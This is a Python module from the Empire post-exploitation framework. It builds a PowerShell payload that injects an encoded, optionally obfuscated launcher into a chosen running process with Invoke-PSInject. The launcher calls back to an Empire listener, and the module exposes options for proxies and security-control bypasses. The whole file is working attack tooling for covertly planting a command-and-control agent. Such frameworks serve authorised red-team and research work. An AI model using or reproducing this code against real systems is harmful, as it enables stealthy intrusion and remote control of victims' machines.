from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        proc_id = params["ProcId"].strip()
        proc_name = params["ProcName"].strip()
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        if proc_id == "" and proc_name == "":
            return handle_error_message(
                "[!] Either ProcID or ProcName must be specified."
            )

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = ""
        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message(f"[!] Invalid listener: {listener_name}")

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name=listener_name,
            language="powershell",
            obfuscate=launcher_obfuscate,
            obfuscation_command=launcher_obfuscate_command,
            encode=True,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
            bypasses=params["Bypasses"],
        )
        MAX_LAUNCHER_LEN = 5952
        if launcher == "":
            return handle_error_message("[!] Error in launcher generation.")
        if len(launcher) > MAX_LAUNCHER_LEN:
            return handle_error_message("[!] Launcher string is too long!")

        launcher_code = launcher.split(" ")[-1]

        if proc_id != "":
            script_end += f"Invoke-PSInject -ProcID {proc_id} -PoshCode {launcher_code}"
        else:
            script_end += (
                f"Invoke-PSInject -ProcName {proc_name} -PoshCode {launcher_code}"
            )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
